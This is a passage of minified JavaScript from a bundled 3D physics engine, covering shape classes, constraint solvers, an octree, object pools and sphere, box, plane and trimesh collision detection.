o(){n.call(this),this.type=n.types.PARTICLE}o.prototype=new n,o.prototype.constructor=o,o.prototype.calculateLocalInertia=function(e,t){return(t=t||new r).set(0,0,0),t},o.prototype.volume=function(){return 0},o.prototype.updateBoundingSphereRadius=function(){this.boundingSphereRadius=0},o.prototype.calculateWorldAABB=function(e,t,i,n){i.copy(e),n.copy(e)}},{"../math/Vec3":30,"./Shape":43}],42:[function(e,t,i){t.exports=o;var n=e("./Shape"),r=e("../math/Vec3");function o(){n.call(this),this.type=n.types.PLANE,this.worldNormal=new r,this.worldNormalNeedsUpdate=!0,this.boundingSphereRadius=Number.MAX_VALUE}o.prototype=new n,o.prototype.constructor=o,o.prototype.computeWorldNormal=function(e){var t=this.worldNormal;t.set(0,0,1),e.vmult(t,t),this.worldNormalNeedsUpdate=!1},o.prototype.calculateLocalInertia=function(e,t){return t=t||new r},o.prototype.volume=function(){return Number.MAX_VALUE};var a=new r;o.prototype.calculateWorldAABB=function(e,t,i,n){a.set(0,0,1),t.vmult(a,a);var r=Number.MAX_VALUE;i.set(-r,-r,-r),n.set(r,r,r),1===a.x&&(n.x=e.x),1===a.y&&(n.y=e.y),1===a.z&&(n.z=e.z),-1===a.x&&(i.x=e.x),-1===a.y&&(i.y=e.y),-1===a.z&&(i.z=e.z)},o.prototype.updateBoundingSphereRadius=function(){this.boundingSphereRadius=Number.MAX_VALUE}},{"../math/Vec3":30,"./Shape":43}],43:[function(e,t,i){t.exports=n;var n=e("./Shape");function n(){this.id=n.idCounter++,this.type=0,this.boundingSphereRadius=0,this.collisionResponse=!0,this.material=null}e("../math/Vec3"),e("../math/Quaternion"),e("../material/Material"),n.prototype.constructor=n,n.prototype.updateBoundingSphereRadius=function(){throw"computeBoundingSphereRadius() not implemented for shape type "+this.type},n.prototype.volume=function(){throw"volume() not implemented for shape type "+this.type},n.prototype.calculateLocalInertia=function(e,t){throw"calculateLocalInertia() not implemented for shape type "+this.type},n.idCounter=0,n.types={SPHERE:1,PLANE:2,BOX:4,COMPOUND:8,CONVEXPOLYHEDRON:16,HEIGHTFIELD:32,PARTICLE:64,CYLINDER:128,TRIMESH:256}},{"../material/Material":25,"../math/Quaternion":28,"../math/Vec3":30,"./Shape":43}],44:[function(e,t,i){t.exports=o;var n=e("./Shape"),r=e("../math/Vec3");function o(e){if(n.call(this),this.radius=void 0!==e?Number(e):1,this.type=n.types.SPHERE,this.radius<0)throw new Error("The sphere radius cannot be negative.");this.updateBoundingSphereRadius()}o.prototype=new n,o.prototype.constructor=o,o.prototype.calculateLocalInertia=function(e,t){t=t||new r;var i=2*e*this.radius*this.radius/5;return t.x=i,t.y=i,t.z=i,t},o.prototype.volume=function(){return 4*Math.PI*this.radius/3},o.prototype.updateBoundingSphereRadius=function(){this.boundingSphereRadius=this.radius},o.prototype.calculateWorldAABB=function(e,t,i,n){for(var r=this.radius,o=["x","y","z"],a=0;a<o.length;a++){var s=o[a];i[s]=e[s]-r,n[s]=e[s]+r}}},{"../math/Vec3":30,"./Shape":43}],45:[function(e,t,i){t.exports=c;var n=e("./Shape"),r=e("../math/Vec3"),o=(e("../math/Quaternion"),e("../math/Transform")),a=e("../collision/AABB"),s=e("../utils/Octree");function c(e,t){n.call(this),this.type=n.types.TRIMESH,this.vertices=new Float32Array(e),this.indices=new Int16Array(t),this.normals=new Float32Array(t.length),this.aabb=new a,this.edges=null,this.scale=new r(1,1,1),this.tree=new s,this.updateEdges(),this.updateNormals(),this.updateAABB(),this.updateBoundingSphereRadius(),this.updateTree()}c.prototype=new n,c.prototype.constructor=c;var l=new r;c.prototype.updateTree=function(){var e=this.tree;e.reset(),e.aabb.copy(this.aabb);var t=this.scale;e.aabb.lowerBound.x*=1/t.x,e.aabb.lowerBound.y*=1/t.y,e.aabb.lowerBound.z*=1/t.z,e.aabb.upperBound.x*=1/t.x,e.aabb.upperBound.y*=1/t.y,e.aabb.upperBound.z*=1/t.z;for(var i=new a,n=new r,o=new r,s=new r,c=[n,o,s],l=0;l<this.indices.length/3;l++){var h=3*l;this._getUnscaledVertex(this.indices[h],n),this._getUnscaledVertex(this.indices[h+1],o),this._getUnscaledVertex(this.indices[h+2],s),i.setFromPoints(c),e.insert(i,l)}e.removeEmptyNodes()};var h=new a;c.prototype.getTrianglesInAABB=function(e,t){h.copy(e);var i=this.scale,n=i.x,r=i.y,o=i.z,a=h.lowerBound,s=h.upperBound;return a.x/=n,a.y/=r,a.z/=o,s.x/=n,s.y/=r,s.z/=o,this.tree.aabbQuery(h,t)},c.prototype.setScale=function(e){var t=this.scale.x===this.scale.y===this.scale.z,i=e.x===e.y===e.z;t&&i||this.updateNormals(),this.scale.copy(e),this.updateAABB(),this.updateBoundingSphereRadius()},c.prototype.updateNormals=function(){for(var e=l,t=this.normals,i=0;i<this.indices.length/3;i++){var n=3*i,r=this.indices[n],o=this.indices[n+1],a=this.indices[n+2];this.getVertex(r,m),this.getVertex(o,v),this.getVertex(a,g),c.computeNormal(v,m,g,e),t[n]=e.x,t[n+1]=e.y,t[n+2]=e.z}},c.prototype.updateEdges=function(){for(var e={},t=function(t,i){e[r<o?r+"_"+o:o+"_"+r]=!0},i=0;i<this.indices.length/3;i++){var n=3*i,r=this.indices[n],o=this.indices[n+1];this.indices[n+2],t(),t(),t()}var a=Object.keys(e);for(this.edges=new Int16Array(2*a.length),i=0;i<a.length;i++){var s=a[i].split("_");this.edges[2*i]=parseInt(s[0],10),this.edges[2*i+1]=parseInt(s[1],10)}},c.prototype.getEdgeVertex=function(e,t,i){var n=this.edges[2*e+(t?1:0)];this.getVertex(n,i)};var u=new r,d=new r;c.prototype.getEdgeVector=function(e,t){var i=u,n=d;this.getEdgeVertex(e,0,i),this.getEdgeVertex(e,1,n),n.vsub(i,t)};var p=new r,f=new r;c.computeNormal=function(e,t,i,n){t.vsub(e,f),i.vsub(t,p),p.cross(f,n),n.isZero()||n.normalize()};var m=new r,v=new r,g=new r;c.prototype.getVertex=function(e,t){var i=this.scale;return this._getUnscaledVertex(e,t),t.x*=i.x,t.y*=i.y,t.z*=i.z,t},c.prototype._getUnscaledVertex=function(e,t){var i=3*e,n=this.vertices;return t.set(n[i],n[i+1],n[i+2])},c.prototype.getWorldVertex=function(e,t,i,n){return this.getVertex(e,n),o.pointToWorldFrame(t,i,n,n),n},c.prototype.getTriangleVertices=function(e,t,i,n){var r=3*e;this.getVertex(this.indices[r],t),this.getVertex(this.indices[r+1],i),this.getVertex(this.indices[r+2],n)},c.prototype.getNormal=function(e,t){var i=3*e;return t.set(this.normals[i],this.normals[i+1],this.normals[i+2])};var y=new a;c.prototype.calculateLocalInertia=function(e,t){this.computeLocalAABB(y);var i=y.upperBound.x-y.lowerBound.x,n=y.upperBound.y-y.lowerBound.y,r=y.upperBound.z-y.lowerBound.z;return t.set(1/12*e*(2*n*2*n+2*r*2*r),1/12*e*(2*i*2*i+2*r*2*r),1/12*e*(2*n*2*n+2*i*2*i))};var b=new r;c.prototype.computeLocalAABB=function(e){var t=e.lowerBound,i=e.upperBound,n=this.vertices.length,r=(this.vertices,b);this.getVertex(0,r),t.copy(r),i.copy(r);for(var o=0;o!==n;o++)this.getVertex(o,r),r.x<t.x?t.x=r.x:r.x>i.x&&(i.x=r.x),r.y<t.y?t.y=r.y:r.y>i.y&&(i.y=r.y),r.z<t.z?t.z=r.z:r.z>i.z&&(i.z=r.z)},c.prototype.updateAABB=function(){this.computeLocalAABB(this.aabb)},c.prototype.updateBoundingSphereRadius=function(){for(var e=0,t=this.vertices,i=new r,n=0,o=t.length/3;n!==o;n++){this.getVertex(n,i);var a=i.norm2();a>e&&(e=a)}this.boundingSphereRadius=Math.sqrt(e)},new r;var w=new o,x=new a;c.prototype.calculateWorldAABB=function(e,t,i,n){var r=w,o=x;r.position=e,r.quaternion=t,this.aabb.toWorldFrame(r,o),i.copy(o.lowerBound),n.copy(o.upperBound)},c.prototype.volume=function(){return 4*Math.PI*this.boundingSphereRadius/3},c.createTorus=function(e,t,i,n,r){e=e||1,t=t||.5,i=i||8,n=n||6,r=r||2*Math.PI;for(var o=[],a=[],s=0;s<=i;s++)for(var l=0;l<=n;l++){var h=l/n*r,u=s/i*Math.PI*2,d=(e+t*Math.cos(u))*Math.cos(h),p=(e+t*Math.cos(u))*Math.sin(h),f=t*Math.sin(u);o.push(d,p,f)}for(s=1;s<=i;s++)for(l=1;l<=n;l++){var m=(n+1)*s+l-1,v=(n+1)*(s-1)+l-1,g=(n+1)*(s-1)+l,y=(n+1)*s+l;a.push(m,v,y),a.push(v,g,y)}return new c(o,a)}},{"../collision/AABB":3,"../math/Quaternion":28,"../math/Transform":29,"../math/Vec3":30,"../utils/Octree":50,"./Shape":43}],46:[function(e,t,i){t.exports=r,e("../math/Vec3"),e("../math/Quaternion");var n=e("./Solver");function r(){n.call(this),this.iterations=10,this.tolerance=1e-7}r.prototype=new n;var o=[],a=[],s=[];r.prototype.solve=function(e,t){var i,n,r,c,l,h=0,u=this.iterations,d=this.tolerance*this.tolerance,p=this.equations,f=p.length,m=t.bodies,v=m.length,g=e;if(0!==f)for(var y=0;y!==v;y++)m[y].updateSolveMassProperties();var b=a,w=s,x=o;for(b.length=f,w.length=f,x.length=f,y=0;y!==f;y++){var _=p[y];x[y]=0,w[y]=_.computeB(g),b[y]=1/_.computeC()}if(0!==f){for(y=0;y!==v;y++){var M=(E=m[y]).vlambda,S=E.wlambda;M.set(0,0,0),S&&S.set(0,0,0)}for(h=0;h!==u;h++){c=0;for(var T=0;T!==f;T++)_=p[T],i=w[T],n=b[T],(l=x[T])+(r=n*(i-_.computeGWlambda()-_.eps*l))<_.minForce?r=_.minForce-l:l+r>_.maxForce&&(r=_.maxForce-l),x[T]+=r,c+=r>0?r:-r,_.addToWlambda(r);if(c*c<d)break}for(y=0;y!==v;y++){var E,A=(E=m[y]).velocity,C=E.angularVelocity;A.vadd(E.vlambda,A),C&&C.vadd(E.wlambda,C)}}return h}},{"../math/Quaternion":28,"../math/Vec3":30,"./Solver":47}],47:[function(e,t,i){function n(){this.equations=[]}t.exports=n,n.prototype.solve=function(e,t){return 0},n.prototype.addEquation=function(e){e.enabled&&this.equations.push(e)},n.prototype.removeEquation=function(e){var t=this.equations,i=t.indexOf(e);-1!==i&&t.splice(i,1)},n.prototype.removeAllEquations=function(){this.equations.length=0}},{}],48:[function(e,t,i){t.exports=o,e("../math/Vec3"),e("../math/Quaternion");var n=e("./Solver"),r=e("../objects/Body");function o(e){for(n.call(this),this.iterations=10,this.tolerance=1e-7,this.subsolver=e,this.nodes=[],this.nodePool=[];this.nodePool.length<128;)this.nodePool.push(this.createNode())}o.prototype=new n;var a=[],s=[],c={bodies:[]},l=r.STATIC;function h(e){for(var t=e.length,i=0;i!==t;i++){var n=e[i];if(!(n.visited||n.body.type&l))return n}return!1}var u=[];function d(e,t,i,n){for(u.push(e),e.visited=!0,t(e,i,n);u.length;)for(var r,o=u.pop();r=h(o.children);)r.visited=!0,t(r,i,n),u.push(r)}function p(e,t,i){t.push(e.body);for(var n=e.eqs.length,r=0;r!==n;r++){var o=e.eqs[r];-1===i.indexOf(o)&&i.push(o)}}function f(e,t){return t.id-e.id}o.prototype.createNode=function(){return{body:null,children:[],eqs:[],visited:!1}},o.prototype.solve=function(e,t){for(var i=a,n=this.nodePool,r=t.bodies,o=this.equations,l=o.length,u=r.length,m=this.subsolver;n.length<u;)n.push(this.createNode());i.length=u;for(var v=0;v<u;v++)i[v]=n[v];for(v=0;v!==u;v++){var g=i[v];g.body=r[v],g.children.length=0,g.eqs.length=0,g.visited=!1}for(var y=0;y!==l;y++){var b=o[y],w=(v=r.indexOf(b.bi),r.indexOf(b.bj)),x=i[v],_=i[w];x.children.push(_),x.eqs.push(b),_.children.push(x),_.eqs.push(b)}var M,S=0,T=s;m.tolerance=this.tolerance,m.iterations=this.iterations;for(var E=c;M=h(i);){T.length=0,E.bodies.length=0,d(M,p,E.bodies,T);var A=T.length;for(T=T.sort(f),v=0;v!==A;v++)m.addEquation(T[v]);m.solve(e,E),m.removeAllEquations(),S++}return S}},{"../math/Quaternion":28,"../math/Vec3":30,"../objects/Body":31,"./Solver":47}],49:[function(e,t,i){var n=function(){};t.exports=n,n.prototype={constructor:n,addEventListener:function(e,t){void 0===this._listeners&&(this._listeners={});var i=this._listeners;return void 0===i[e]&&(i[e]=[]),-1===i[e].indexOf(t)&&i[e].push(t),this},hasEventListener:function(e,t){if(void 0===this._listeners)return!1;var i=this._listeners;return void 0!==i[e]&&-1!==i[e].indexOf(t)},removeEventListener:function(e,t){if(void 0===this._listeners)return this;var i=this._listeners;if(void 0===i[e])return this;var n=i[e].indexOf(t);return-1!==n&&i[e].splice(n,1),this},dispatchEvent:function(e){if(void 0===this._listeners)return this;var t=this._listeners[e.type];if(void 0!==t){e.target=this;for(var i=0,n=t.length;i<n;i++)t[i].call(this,e)}return this}}},{}],50:[function(e,t,i){var n=e("../collision/AABB"),r=e("../math/Vec3");function o(e){e=e||{},this.root=e.root||null,this.aabb=e.aabb?e.aabb.clone():new n,this.data=[],this.children=[]}function a(e,t){(t=t||{}).root=null,t.aabb=e,o.call(this,t),this.maxDepth=void 0!==t.maxDepth?t.maxDepth:8}t.exports=a,a.prototype=new o,o.prototype.reset=function(e,t){this.children.length=this.data.length=0},o.prototype.insert=function(e,t,i){var n=this.data;if(i=i||0,!this.aabb.contains(e))return!1;var r=this.children;if(i<(this.maxDepth||this.root.maxDepth)){var o=!1;r.length||(this.subdivide(),o=!0);for(var a=0;8!==a;a++)if(r[a].insert(e,t,i+1))return!0;o&&(r.length=0)}return n.push(t),!0};var s=new r;o.prototype.subdivide=function(){var e=this.aabb,t=e.lowerBound,i=e.upperBound,a=this.children;a.push(new o({aabb:new n({lowerBound:new r(0,0,0)})}),new o({aabb:new n({lowerBound:new r(1,0,0)})}),new o({aabb:new n({lowerBound:new r(1,1,0)})}),new o({aabb:new n({lowerBound:new r(1,1,1)})}),new o({aabb:new n({lowerBound:new r(0,1,1)})}),new o({aabb:new n({lowerBound:new r(0,0,1)})}),new o({aabb:new n({lowerBound:new r(1,0,1)})}),new o({aabb:new n({lowerBound:new r(0,1,0)})})),i.vsub(t,s),s.scale(.5,s);for(var c=this.root||this,l=0;8!==l;l++){var h=a[l];h.root=c;var u=h.aabb.lowerBound;u.x*=s.x,u.y*=s.y,u.z*=s.z,u.vadd(t,u),u.vadd(s,h.aabb.upperBound)}},o.prototype.aabbQuery=function(e,t){this.data,this.children;for(var i=[this];i.length;){var n=i.pop();n.aabb.overlaps(e)&&Array.prototype.push.apply(t,n.data),Array.prototype.push.apply(i,n.children)}return t};var c=new n;o.prototype.rayQuery=function(e,t,i){return e.getAABB(c),c.toLocalFrame(t,c),this.aabbQuery(c,i),i},o.prototype.removeEmptyNodes=function(){for(var e=[this];e.length;){for(var t=e.pop(),i=t.children.length-1;i>=0;i--)t.children[i].data.length||t.children.splice(i,1);Array.prototype.push.apply(e,t.children)}}},{"../collision/AABB":3,"../math/Vec3":30}],51:[function(e,t,i){function n(){this.objects=[],this.type=Object}t.exports=n,n.prototype.release=function(){for(var e=arguments.length,t=0;t!==e;t++)this.objects.push(arguments[t])},n.prototype.get=function(){return 0===this.objects.length?this.constructObject():this.objects.pop()},n.prototype.constructObject=function(){throw new Error("constructObject() not implemented in this Pool subclass yet!")}},{}],52:[function(e,t,i){function n(){this.data={keys:[]}}t.exports=n,n.prototype.get=function(e,t){if(e>t){var i=t;t=e,e=i}return this.data[e+"-"+t]},n.prototype.set=function(e,t,i){if(e>t){var n=t;t=e,e=n}var r=e+"-"+t;this.get(e,t)||this.data.keys.push(r),this.data[r]=i},n.prototype.reset=function(){for(var e=this.data,t=e.keys;t.length>0;)delete e[t.pop()]}},{}],53:[function(e,t,i){function n(){}t.exports=n,n.defaults=function(e,t){for(var i in e=e||{},t)i in e||(e[i]=t[i]);return e}},{}],54:[function(e,t,i){t.exports=o;var n=e("../math/Vec3"),r=e("./Pool");function o(){r.call(this),this.type=n}o.prototype=new r,o.prototype.constructObject=function(){return new n}},{"../math/Vec3":30,"./Pool":51}],55:[function(e,t,i){t.exports=d;var n=e("../collision/AABB"),r=e("../shapes/Shape"),o=e("../collision/Ray"),a=e("../math/Vec3"),s=e("../math/Transform"),c=(e("../shapes/ConvexPolyhedron"),e("../math/Quaternion")),l=(e("../solver/Solver"),e("../utils/Vec3Pool")),h=e("../equations/ContactEquation"),u=e("../equations/FrictionEquation");function d(e){this.contactPointPool=[],this.frictionEquationPool=[],this.result=[],this.frictionResult=[],this.v3pool=new l,this.world=e,this.currentContactMaterial=null,this.enableFrictionReduction=!1}d.prototype.createContactEquation=function(e,t,i,n,r,o){var a;this.contactPointPool.length?((a=this.contactPointPool.pop()).bi=e,a.bj=t):a=new h(e,t),a.enabled=e.collisionResponse&&t.collisionResponse&&i.collisionResponse&&n.collisionResponse;var s=this.currentContactMaterial;a.restitution=s.restitution,a.setSpookParams(s.contactEquationStiffness,s.contactEquationRelaxation,this.world.dt);var c=i.material||e.material,l=n.material||t.material;return c&&l&&c.restitution>=0&&l.restitution>=0&&(a.restitution=c.restitution*l.restitution),a.si=r||i,a.sj=o||n,a},d.prototype.createFrictionEquationsFromContact=function(e,t){var i=e.bi,n=e.bj,r=e.si,o=e.sj,a=this.world,s=this.currentContactMaterial,c=s.friction,l=r.material||i.material,h=o.material||n.material;if(l&&h&&l.friction>=0&&h.friction>=0&&(c=l.friction*h.friction),c>0){var d=c*a.gravity.length(),p=i.invMass+n.invMass;p>0&&(p=1/p);var f=this.frictionEquationPool,m=f.length?f.pop():new u(i,n,d*p),v=f.length?f.pop():new u(i,n,d*p);return m.bi=v.bi=i,m.bj=v.bj=n,m.minForce=v.minForce=-d*p,m.maxForce=v.maxForce=d*p,m.ri.copy(e.ri),m.rj.copy(e.rj),v.ri.copy(e.ri),v.rj.copy(e.rj),e.ni.tangents(m.t,v.t),m.setSpookParams(s.frictionEquationStiffness,s.frictionEquationRelaxation,a.dt),v.setSpookParams(s.frictionEquationStiffness,s.frictionEquationRelaxation,a.dt),m.enabled=v.enabled=e.enabled,t.push(m,v),!0}return!1};var p=new a,f=new a,m=new a;d.prototype.createFrictionFromAverage=function(e){var t=this.result[this.result.length-1];if(this.createFrictionEquationsFromContact(t,this.frictionResult)&&1!==e){var i=this.frictionResult[this.frictionResult.length-2],n=this.frictionResult[this.frictionResult.length-1];p.setZero(),f.setZero(),m.setZero();for(var r=t.bi,o=(t.bj,0);o!==e;o++)(t=this.result[this.result.length-1-o]).bodyA!==r?(p.vadd(t.ni,p),f.vadd(t.ri,f),m.vadd(t.rj,m)):(p.vsub(t.ni,p),f.vadd(t.rj,f),m.vadd(t.ri,m));var a=1/e;f.scale(a,i.ri),m.scale(a,i.rj),n.ri.copy(i.ri),n.rj.copy(i.rj),p.normalize(),p.tangents(i.t,n.t)}};var v=new a,g=new a,y=new c,b=new c;d.prototype.getContacts=function(e,t,i,n,r,o,a){this.contactPointPool=r,this.frictionEquationPool=a,this.result=n,this.frictionResult=o;for(var s=y,c=b,l=v,h=g,u=0,d=e.length;u!==d;u++){var p=e[u],f=t[u],m=null;p.material&&f.material&&(m=i.getContactMaterial(p.material,f.material)||null);for(var w=0;w<p.shapes.length;w++){p.quaternion.mult(p.shapeOrientations[w],s),p.quaternion.vmult(p.shapeOffsets[w],l),l.vadd(p.position,l);for(var x=p.shapes[w],_=0;_<f.shapes.length;_++){f.quaternion.mult(f.shapeOrientations[_],c),f.quaternion.vmult(f.shapeOffsets[_],h),h.vadd(f.position,h);var M=f.shapes[_];if(!(l.distanceTo(h)>x.boundingSphereRadius+M.boundingSphereRadius)){var S=null;x.material&&M.material&&(S=i.getContactMaterial(x.material,M.material)||null),this.currentContactMaterial=S||m||i.defaultContactMaterial;var T=this[x.type|M.type];T&&(x.type<M.type?T.call(this,x,M,l,h,s,c,p,f,x,M):T.call(this,M,x,h,l,c,s,f,p,x,M))}}}}},d.prototype[r.types.BOX|r.types.BOX]=d.prototype.boxBox=function(e,t,i,n,r,o,a,s){e.convexPolyhedronRepresentation.material=e.material,t.convexPolyhedronRepresentation.material=t.material,e.convexPolyhedronRepresentation.collisionResponse=e.collisionResponse,t.convexPolyhedronRepresentation.collisionResponse=t.collisionResponse,this.convexConvex(e.convexPolyhedronRepresentation,t.convexPolyhedronRepresentation,i,n,r,o,a,s,e,t)},d.prototype[r.types.BOX|r.types.CONVEXPOLYHEDRON]=d.prototype.boxConvex=function(e,t,i,n,r,o,a,s){e.convexPolyhedronRepresentation.material=e.material,e.convexPolyhedronRepresentation.collisionResponse=e.collisionResponse,this.convexConvex(e.convexPolyhedronRepresentation,t,i,n,r,o,a,s,e,t)},d.prototype[r.types.BOX|r.types.PARTICLE]=d.prototype.boxParticle=function(e,t,i,n,r,o,a,s){e.convexPolyhedronRepresentation.material=e.material,e.convexPolyhedronRepresentation.collisionResponse=e.collisionResponse,this.convexParticle(e.convexPolyhedronRepresentation,t,i,n,r,o,a,s,e,t)},d.prototype[r.types.SPHERE]=d.prototype.sphereSphere=function(e,t,i,n,r,o,a,s){var c=this.createContactEquation(a,s,e,t);n.vsub(i,c.ni),c.ni.normalize(),c.ri.copy(c.ni),c.rj.copy(c.ni),c.ri.mult(e.radius,c.ri),c.rj.mult(-t.radius,c.rj),c.ri.vadd(i,c.ri),c.ri.vsub(a.position,c.ri),c.rj.vadd(n,c.rj),c.rj.vsub(s.position,c.rj),this.result.push(c),this.createFrictionEquationsFromContact(c,this.frictionResult)};var w=new a,x=new a,_=new a;d.prototype[r.types.PLANE|r.types.TRIMESH]=d.prototype.planeTrimesh=function(e,t,i,n,r,o,c,l){var h=new a,u=w;u.set(0,0,1),r.vmult(u,u);for(var d=0;d<t.vertices.length/3;d++){t.getVertex(d,h);var p=new a;p.copy(h),s.pointToWorldFrame(n,o,p,h);var f=x;if(h.vsub(i,f),u.dot(f)<=0){var m=this.createContactEquation(c,l,e,t);m.ni.copy(u);var v=_;u.scale(f.dot(u),v),h.vsub(v,v),m.ri.copy(v),m.ri.vsub(c.position,m.ri),m.rj.copy(h),m.rj.vsub(l.position,m.rj),this.result.push(m),this.createFrictionEquationsFromContact(m,this.frictionResult)}}};var M=new a,S=new a,T=(new a,new a),E=new a,A=new a,C=new a,P=new a,L=new a,R=new a,k=new a,O=new a,I=new a,B=new a,D=new n,z=[];d.prototype[r.types.SPHERE|r.types.TRIMESH]=d.prototype.sphereTrimesh=function(e,t,i,n,r,a,c,l){var h=A,u=C,d=P,p=L,f=R,m=k,v=D,g=E,y=S,b=z;s.pointToLocalFrame(n,a,i,f);var w=e.radius;v.lowerBound.set(f.x-w,f.y-w,f.z-w),v.upperBound.set(f.x+w,f.y+w,f.z+w),t.getTrianglesInAABB(v,b);for(var x=T,_=e.radius*e.radius,F=0;F<b.length;F++)for(var N=0;N<3;N++)t.getVertex(t.indices[3*b[F]+N],x),x.vsub(f,y),y.norm2()<=_&&(g.copy(x),s.pointToWorldFrame(n,a,g,x),x.vsub(i,y),(V=this.createContactEquation(c,l,e,t)).ni.copy(y),V.ni.normalize(),V.ri.copy(V.ni),V.ri.scale(e.radius,V.ri),V.ri.vadd(i,V.ri),V.ri.vsub(c.position,V.ri),V.rj.copy(x),V.rj.vsub(l.position,V.rj),this.result.push(V),this.createFrictionEquationsFromContact(V,this.frictionResult));for(F=0;F<b.length;F++)for(N=0;N<3;N++){t.getVertex(t.indices[3*b[F]+N],h),t.getVertex(t.indices[3*b[F]+(N+1)%3],u),u.vsub(h,d),f.vsub(u,m);var j=m.dot(d);f.vsub(h,m);var U=m.dot(d);if(U>0&&j<0&&(f.vsub(h,m),p.copy(d),p.normalize(),U=m.dot(p),p.scale(U,m),m.vadd(h,m),(Y=m.distanceTo(f))<e.radius)){var V=this.createContactEquation(c,l,e,t);m.vsub(f,V.ni),V.ni.normalize(),V.ni.scale(e.radius,V.ri),s.pointToWorldFrame(n,a,m,m),m.vsub(l.position,V.rj),s.vectorToWorldFrame(a,V.ni,V.ni),s.vectorToWorldFrame(a,V.ri,V.ri),this.result.push(V),this.createFrictionEquationsFromContact(V,this.frictionResult)}}for(var H=O,G=I,W=B,q=M,X=(F=0,b.length);F!==X;F++){t.getTriangleVertices(b[F],H,G,W),t.getNormal(b[F],q),f.vsub(H,m);var Y=m.dot(q);q.scale(Y,m),f.vsub(m,m),Y=m.distanceTo(f),o.pointInTriangle(m,H,G,W)&&Y<e.radius&&(V=this.createContactEquation(c,l,e,t),m.vsub(f,V.ni),V.ni.normalize(),V.ni.scale(e.radius,V.ri),s.pointToWorldFrame(n,a,m,m),m.vsub(l.position,V.rj),s.vectorToWorldFrame(a,V.ni,V.ni),s.vectorToWorldFrame(a,V.ri,V.ri),this.result.push(V),this.createFrictionEquationsFromContact(V,this.frictionResult))}b.length=0};var F=new a,N=new a;d.prototype[r.types.SPHERE|r.types.PLANE]=d.prototype.spherePlane=function(e,t,i,n,r,o,a,s){var c=this.createContactEquation(a,s,e,t);if(c.ni.set(0,0,1),o.vmult(c.ni,c.ni),c.ni.negate(c.ni),c.ni.normalize(),c.ni.mult(e.radius,c.ri),i.vsub(n,F),c.ni.mult(c.ni.dot(F),N),F.vsub(N,c.rj),-F.dot(c.ni)<=e.radius){var l=c.ri,h=c.rj;l.vadd(i,l),l.vsub(a.position,l),h.vadd(n,h),h.vsub(s.position,h),this.result.push(c),this.createFrictionEquationsFromContact(c,this.frictionResult)}};var j=new a,U=new a,V=new a;function H(e,t,i){for(var n=null,r=e.length,o=0;o!==r;o++){var a=e[o],s=j;e[(o+1)%r].vsub(a,s);var c=U;s.cross(t,c);var l=V;i.vsub(a,l);var h=c.dot(l);if(!(null===n||h>0&&!0===n||h<=0&&!1===n))return!1;null===n&&(n=h>0)}return!0}var G=new a,W=new a,q=new a,X=new a,Y=[new a,new a,new a,new a,new a,new a],Z=new a,Q=new a,$=new a,J=new a;d.prototype[r.types.SPHERE|r.types.BOX]=d.prototype.sphereBox=function(e,t,i,n,r,o,a,s){var c=this.v3pool,l=Y;i.vsub(n,G),t.getSideNormals(l,o);for(var h=e.radius,u=!1,d=Q,p=$,f=J,m=null,v=0,g=0,y=0,b=null,w=0,x=l.length;w!==x&&!1===u;w++){var _=W;_.copy(l[w]);var M=_.norm();_.normalize();var S=G.dot(_);if(S<M+h&&S>0){var T=q,E=X;T.copy(l[(w+1)%3]),E.copy(l[(w+2)%3]);var A=T.norm(),C=E.norm();T.normalize(),E.normalize();var P=G.dot(T),L=G.dot(E);if(P<A&&P>-A&&L<C&&L>-C){var R=Math.abs(S-M-h);(null===b||R<b)&&(b=R,g=P,y=L,m=M,d.copy(_),p.copy(T),f.copy(E),v++)}}}if(v){u=!0;var k=this.createContactEquation(a,s,e,t);d.mult(-h,k.ri),k.ni.copy(d),k.ni.negate(k.ni),d.mult(m,d),p.mult(g,p),d.vadd(p,d),f.mult(y,f),d.vadd(f,k.rj),k.ri.vadd(i,k.ri),k.ri.vsub(a.position,k.ri),k.rj.vadd(n,k.rj),k.rj.vsub(s.position,k.rj),this.result.push(k),this.createFrictionEquationsFromContact(k,this.frictionResult)}for(var O=c.get(),I=Z,B=0;2!==B&&!u;B++)for(var D=0;2!==D&&!u;D++)for(var z=0;2!==z&&!u;z++)O.set(0,0,0),B?O.vadd(l[0],O):O.vsub(l[0],O),D?O.vadd(l[1],O):O.vsub(l[1],O),z?O.vadd(l[2],O):O.vsub(l[2],O),n.vadd(O,I),I.vsub(i,I),I.norm2()<h*h&&(u=!0,(k=this.createContactEquation(a,s,e,t)).ri.copy(I),k.ri.normalize(),k.ni.copy(k.ri),k.ri.mult(h,k.ri),k.rj.copy(O),k.ri.vadd(i,k.ri),k.ri.vsub(a.position,k.ri),k.rj.vadd(n,k.rj),k.rj.vsub(s.position,k.rj),this.result.push(k),this.createFrictionEquationsFromContact(k,this.frictionResult));c.release(O),O=null;var F=c.get(),N=c.get(),j=(k=c.get(),c.get()),U=(R=c.get(),l.length);for(B=0;B!==U&&!u;B++)for(D=0;D!==U&&!u;D++)if(B%3!=D%3){l[D].cross(l[B],F),F.normalize(),l[B].vadd(l[D],N),k.copy(i),k.vsub(N,k),k.vsub(n,k);var V=k.dot(F);for(F.mult(V,j),z=0;z===B%3||z===D%3;)z++;R.copy(i),R.vsub(j,R),R.vsub(N,R),R.vsub(n,R);var H=Math.abs(V),K=R.norm();if(H<l[z].norm()&&K<h){u=!0;var ee=this.createContactEquation(a,s,e,t);N.vadd(j,ee.rj),ee.rj.copy(ee.rj),R.negate(ee.ni),ee.ni.normalize(),ee.ri.copy(ee.rj),ee.ri.vadd(n,ee.ri),ee.ri.vsub(i,ee.ri),ee.ri.normalize(),ee.ri.mult(h,ee.ri),ee.ri.vadd(i,ee.ri),ee.ri.vsub(a.position,ee.ri),ee.rj.vadd(n,ee.rj),ee.rj.vsub(s.position,ee.rj),this.result.push(ee),this.createFrictionEquationsFromContact(ee,this.frictionResult)}}c.release(F,N,k,j,R)};var K=new a,ee=new a,te=new a,ie=new a,ne=new a,re=new a,oe=new a,ae=new a,se=new a,ce=new a;d.prototype[r.types.SPHERE|r.types.CONVEXPOLYHEDRON]=d.prototype.sphereConvex=function(e,t,i,n,r,o,a,s){var c=this.v3pool;i.vsub(n,K);for(var l=t.faceNormals,h=t.faces,u=t.vertices,d=e.radius,p=0;p!==u.length;p++){var f=u[p],m=ne;o.vmult(f,m),n.vadd(m,m);var v=ie;if(m.vsub(i,v),v.norm2()<d*d)return 